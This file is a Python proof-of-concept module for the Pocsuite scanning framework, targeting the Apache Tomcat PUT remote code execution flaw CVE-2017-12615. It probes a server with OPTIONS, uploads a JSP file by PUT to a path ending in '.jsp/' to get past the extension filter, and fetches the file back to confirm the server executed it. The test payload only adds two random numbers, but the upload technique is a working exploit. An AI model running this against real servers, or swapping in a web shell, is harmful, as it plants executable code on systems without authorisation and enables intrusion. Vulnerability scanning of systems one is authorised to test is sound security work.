#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Author  : jeffzhang
# @Time    : 2018/01/10
# @File    : _180219_Tomcat_7_PUT_RCE.py.py
# @Desc    : ""


from pocsuite.api.request import req
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase
import random
import time


class TestPOC(POCBase):
    name = "Tomcat Remote Code Execution"
    vulID = ''
    author = 'jeffzhang'
    vulType = 'code execution'
    version = '1.0'
    references = ''
    desc = '''Apache Tomcat CVE-2017-12615 Remote Code Execution Vulnerability'''
    vulDate = '2017-9-19'
    createDate = '2017-9-19'
    updateDate = '2017-9-20'
    appName = 'Apache Tomcat'
    appVersion = '7.0.0 - 7.0.79'
    appPowerLink = ''
    samples = []

    def _attack(self):
        return self._verify()

    def _verify(self):
        result = {}
        a = random.randint(100000, 900000)
        b = random.randint(100000, 900000)
        body = """<%@ page language="java" import="java.util.*,java.io.*" pageEncoding="UTF-8"%>
        <%out.println({0}+{1});%>""" .format(str(a), str(b))
        url = self.url
        resp = req.options(url+'/asda',timeout=10)
        if 'allow' in resp.headers and resp.headers['allow'].find('PUT') > 0:
            shell_url = url + "/" + str(int(time.time())) + '.jsp/'
            resp1 = req.put(shell_url, body)
            print (resp1.status_code)
            resp2 = req.get(shell_url[:-1])
            c = a + b
            if resp1.status_code == 201 and str(c) in resp2.content:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = url
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)
